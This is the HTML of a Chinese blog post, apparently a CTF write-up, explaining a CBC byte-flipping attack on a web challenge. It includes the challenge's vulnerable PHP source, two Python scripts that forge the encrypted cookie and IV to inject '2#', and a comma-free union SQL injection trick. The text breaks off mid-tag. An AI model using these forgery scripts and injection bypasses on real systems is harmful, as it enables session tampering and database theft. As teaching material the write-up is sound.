@@ -1,0 +1,777 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<script type="text/javascript" color="122,122,255" opacity="0.5" zindex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="今晚突然想起来之前有一道web题每次做都因为密码学方面知识的欠缺放弃了，今晚抽空给他研究出来。题目地址:http://ctf5.shiyanbar.com/web/jiandan/index.php，上来先用御剑扫描了一波，发现了test.php文件。访问一下,得到题目源码： 源码源码如下:123456789101112131415161718192021222324252627282930313">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CBC反转攻击问题">
+<meta property="og:url" content="http://yoursite.com/2018/11/21/CBC字节反转攻击问题/index.html">
+<meta property="og:site_name" content="Bling_Dog">
+<meta property="og:description" content="今晚突然想起来之前有一道web题每次做都因为密码学方面知识的欠缺放弃了，今晚抽空给他研究出来。题目地址:http://ctf5.shiyanbar.com/web/jiandan/index.php，上来先用御剑扫描了一波，发现了test.php文件。访问一下,得到题目源码： 源码源码如下:123456789101112131415161718192021222324252627282930313">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-e730d8056fa1a294.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-7de1c86f6db6eb08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-f74cb38af11472ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-062dfce0a35bd51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-68ebc44a0bdb6f77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-93f3e080eee3ff95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-984a41e9fe5003a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9ead9d1b723b66e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-34b9c7e6372ed972.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-f4091b35d642a5a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-30eed08250e39796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-5876aa1beccb15c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-27820750c5917f70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-d535c2707391f1c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-b380baaa6e2d5a40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-2d83570add2d685b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-438b86123d967de2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9de3f75b4062e19d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-f28162f04fe9e231.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9c9271a7016d38c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-7dcaa0668174f1b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-9411bba409a87a95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-32e54f75f4f4649c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-e23b23fd12f4eef2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11234137-3893f6169e0e18e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-12-04T13:58:18.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CBC反转攻击问题">
+<meta name="twitter:description" content="今晚突然想起来之前有一道web题每次做都因为密码学方面知识的欠缺放弃了，今晚抽空给他研究出来。题目地址:http://ctf5.shiyanbar.com/web/jiandan/index.php，上来先用御剑扫描了一波，发现了test.php文件。访问一下,得到题目源码： 源码源码如下:123456789101112131415161718192021222324252627282930313">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11234137-e730d8056fa1a294.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/21/CBC字节反转攻击问题/">
+
+
+
+
+
+  <title>CBC反转攻击问题 | Bling_Dog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Bling_Dog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">奔向大佬路上的小白</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/21/CBC字节反转攻击问题/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Bling_Dog">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bling_Dog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CBC反转攻击问题</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T14:57:50+08:00">
+                2018-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>今晚突然想起来之前有一道web题每次做都因为密码学方面知识的欠缺放弃了，今晚抽空给他研究出来。题目地址:<a href="http://ctf5.shiyanbar.com/web/jiandan/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/jiandan/index.php</a>，上来先用御剑扫描了一波，发现了test.php文件。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-e730d8056fa1a294.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-e730d8056fa1a294.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>访问一下,得到题目源码：<br><img src="https://upload-images.jianshu.io/upload_images/11234137-7de1c86f6db6eb08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-7de1c86f6db6eb08.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p>源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    define(&quot;SECRET_KEY&quot;, &apos;***********&apos;);</span><br><span class="line">    define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    include(&apos;conn.php&apos;);</span><br><span class="line">    function sqliCheck($str)&#123;</span><br><span class="line">    	if(preg_match(&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;,$str))&#123;</span><br><span class="line">    		return 1;</span><br><span class="line">    	&#125;</span><br><span class="line">    	return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function get_random_iv()&#123;</span><br><span class="line">        $random_iv=&apos;&apos;;</span><br><span class="line">        for($i=0;$i&lt;16;$i++)&#123;</span><br><span class="line">            $random_iv.=chr(rand(1,255));</span><br><span class="line">        &#125;</span><br><span class="line">        return $random_iv;</span><br><span class="line">    &#125;</span><br><span class="line">    function login($info)&#123;</span><br><span class="line">    	$iv = get_random_iv();</span><br><span class="line">    	$plain = serialize($info);</span><br><span class="line">        $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">        setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">        setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">    &#125;</span><br><span class="line">    function show_homepage()&#123;</span><br><span class="line">    	global $link;</span><br><span class="line">        if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))&#123;</span><br><span class="line">            $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">            $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">            if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">                $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">                $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;</span><br><span class="line">                $result=mysqli_query($link,$sql);</span><br><span class="line">                </span><br><span class="line">                if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;</span><br><span class="line">                	$rows=mysqli_fetch_array($result);</span><br><span class="line">    				echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">    			&#125;</span><br><span class="line">    			else&#123;</span><br><span class="line">    				echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">    			&#125;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                die(&quot;ERROR!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">        $id = (string)$_POST[&apos;id&apos;];</span><br><span class="line">        if(sqliCheck($id))</span><br><span class="line">    		die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);</span><br><span class="line">        $info = array(&apos;id&apos;=&gt;$id);</span><br><span class="line">        login($info);</span><br><span class="line">        echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123;</span><br><span class="line">            show_homepage();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                    &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                        &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                            &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                            &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                            &lt;span&gt;input id to login&lt;/span&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                            &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                            &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                            &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                            &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span><br><span class="line">                            &lt;/div&gt;</span><br><span class="line">                        &lt;/form&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/body&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br><span class="line">```</span><br></pre></td></tr></table></figure></p>
+<h1 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h1><p>做题之前首先介绍一下CBC的加解密原理，首先是加密原理:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-f74cb38af11472ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-f74cb38af11472ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>由上图:<br>1.Plaintext：待加密的数据。<br>2.IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。<br>3.Ciphertext：加密后的数据。<br>CBC工作于一个固定长度的比特组，称为块，在本文中我们将使用包含16个字节(128比特)的块<br>加密过程的简要叙述：<br>1.首先将明文分组，常见的是以16字节为一组，位数不足的使用特殊符号填充，关于填充规则，这边<a href="https://blog.csdn.net/test1280/article/details/75268255" target="_blank" rel="noopener">有一篇讲的比较容易懂</a><br>2.生成一个随机的初始化向量(IV)和一个密钥<br>3.将IV和第一组明文进行异或操作<br>4.用密钥将第3步异或的结果进行加密操作<br>5.用第4步产生的密文对第二组的明文进行异或操作<br>6.用密钥将第5步异或的结果进行加密操作<br>7.重复4-7操作，直到最后一组明文<br>8.将IV和加密后的密文拼接到一起，得到最终的密文<br>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：前一块的密文用来产生后一块的密文。 </p>
+<h1 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h1><p>然后我们来看解密过程:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-062dfce0a35bd51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-062dfce0a35bd51f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>特点:前一块密文参与下一块密文的还原<br>1.从密文中提取IV，然后将密文分组<br>2.使用密钥对第一组的密文解密，将解密的结果和IV进行异或得到明文<br>3.使用密钥对第二组的密文解密，将解密的结果和第一组的密文进行异或操作<br>4.重复3操作(对第X组的密文解密，将将解密的结果和第x-1组的密文进行异或操作)<br>字节反转攻击原理:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-68ebc44a0bdb6f77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-68ebc44a0bdb6f77.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p>
+<h1 id="CBC反转"><a href="#CBC反转" class="headerlink" title="CBC反转"></a>CBC反转</h1><p>由解密算法可知：<br>A=B^C<br>由^运算的规则可知:<br>A=B^C B=A^C C=A^B<br>由这三点我们可以推出<br>C=A^B<br>C^C=A^B^C=0<br>我们修改B的值，一定会影响到A的值，即B^X^C=B^C^X=A^X<br>下面我们考虑如何进行反转的操作，以id=20为例子，按照题目要求，先将id=20,反序列化。代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$id=&apos;20&apos;;</span><br><span class="line">$info=array(&apos;id&apos;=&gt;$id);</span><br><span class="line">echo(serialize($info));</span><br><span class="line">?&gt;</span><br><span class="line">得到结果：</span><br><span class="line">明文block1 a:1:&#123;s:2:&quot;id&quot;;s:</span><br><span class="line">明文block2 2:&quot;20&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>首先我们先把这一个id给post到对面，通过burpsuite我们可以看到服务器返回给我们的iv和cipher(都是经过base64编码的)。然后我们iv和cipher解码。将cipher进行十六字节分组，其得到的密文block 1和密文block2。我们的目的是把id=20转化成id=2#，所以我们需要修改的地方是block 2中0对应的上一行block 1的{,也就是说，我们要修改的是密文第一块的第五个字节。我们根据之前推导的A=B^C,B^X^C=B^C^X=A^X。可以得到，当我给B也就是现在明文的第五块异或一个值的时候，就相当于给之后解密出来的明文A异或上一个值。所以我们将密文第5块变成cipher[4]^ord(‘0’)^ord(‘#’)，就像与解密的时候，第二块0对应的位置进行了如下操作：ord(‘0’)^ord(‘0’)^ord(‘#’),于是将20转化成了我们想要的2#<br>这里还需要注意一个问题，我们是将第一块进行了修改，才得到了我们想要的第二块，但是我们我们改变了第一块，并没有改变第一块的IV，这样我们解密第一块的时候，就无法得到正确的第一块的明文，所以这里我们还需要产生一个新的IV，使得新的IV的block以后之后，还是原来的字符串。<br>脚本如下：<br>new cipher</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">old_cipher = &apos;Z%2FROz8EpISy8hI%2FHoSX3Kynos9lRTIMeFCzVMoCMkWU%3D&apos;</span><br><span class="line">raw_old_cipher = b64decode(urllib.unquote(old_cipher))</span><br><span class="line">print raw_old_cipher</span><br><span class="line">lst = list(raw_old_cipher)</span><br><span class="line">index  = 4</span><br><span class="line">asd1 = &apos;0&apos;</span><br><span class="line">asd2 = &apos;#&apos;</span><br><span class="line">lst[index]=chr(ord(asd1)^ord(asd2)^ord(lst[index]))</span><br><span class="line">cipher = &apos;&apos;.join(lst)</span><br><span class="line">new_cipher = urllib.quote(b64encode(cipher))</span><br><span class="line">print new_cipher</span><br></pre></td></tr></table></figure>
+<p>new iv</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">old_iv = &apos;v7LpD60wT5xHswtrxBQXFA%3D%3D&apos;</span><br><span class="line">raw_old_iv = b64decode(urllib.unquote(old_iv))</span><br><span class="line">right_plain = &apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">error_plain = &apos;dEOsOuh+QkWYhSn5WTu7PDI6IjIjIjt9&apos;</span><br><span class="line">raw_error_plain = b64decode(error_plain)</span><br><span class="line">lst1 = list(right_plain)</span><br><span class="line">lst2 = list(raw_error_plain)</span><br><span class="line">lst3 = list(raw_old_iv)</span><br><span class="line">print len(lst1)</span><br><span class="line">print len(lst2)</span><br><span class="line">print len(lst3)</span><br><span class="line">new_iv = &apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">    new_iv+=chr(ord(lst1[i])^ord(lst2[i])^ord(lst3[i]))</span><br><span class="line">lst=list()</span><br><span class="line">new_iv = urllib.quote(b64encode(new_iv))</span><br><span class="line">print new_iv</span><br></pre></td></tr></table></figure>
+<p>我们按照这个流程先来一遍，首先post一个id=20，burpsuite看返回包的回显IV和cipher，保存下来。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-93f3e080eee3ff95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-93f3e080eee3ff95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后根据new cipher脚本，得到新的cipher<br><img src="https://upload-images.jianshu.io/upload_images/11234137-984a41e9fe5003a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-984a41e9fe5003a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>用新的cipher替换原本的cipher，burpsuite给服务器发包，保存下来错误信息。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9ead9d1b723b66e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9ead9d1b723b66e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>错误的信息对应着 new cipher中的error_plain，我们将信息都替换上去，跑出新的iv。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-34b9c7e6372ed972.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-34b9c7e6372ed972.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>将新的iv替换掉cookie里面旧的iv，我们可以看到，2#成功传入，我们读到了用户名，接下来就是注入操作。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-f4091b35d642a5a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-f4091b35d642a5a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>首先由于过滤了,以及union。union我们只能通过cbc反转攻击来替换，但是过滤了,的话，我们可以用join语句。union select 1,2,3 相当于 union select * from((select 1)a join (select 2)b join (select 3)c),如下:<br><img src="https://upload-images.jianshu.io/upload_images/11234137-30eed08250e39796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-30eed08250e39796.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>根据上面的过程，先确定回显。发现有3位<br><img 